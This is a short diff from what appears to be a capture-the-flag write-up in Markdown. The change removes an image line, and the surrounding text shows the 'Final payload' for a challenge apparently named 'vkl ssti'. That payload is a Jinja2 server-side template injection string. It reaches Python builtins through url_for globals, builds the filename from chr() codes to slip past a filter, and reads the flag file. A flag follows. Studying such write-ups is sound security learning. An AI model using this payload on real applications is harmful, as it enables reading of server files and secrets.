@@ -76,8 +76,6 @@ Final payload:
 
 ```{% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__.__builtins__.open((chr(102),chr(108),chr(97),chr(103),chr(46),chr(116),chr(120),chr(116))|join).read()}}```
 
-![](img3.png)
-
 ### Flag: web-vkl{filter_is_not_enough}
 
 ## vkl ssti2
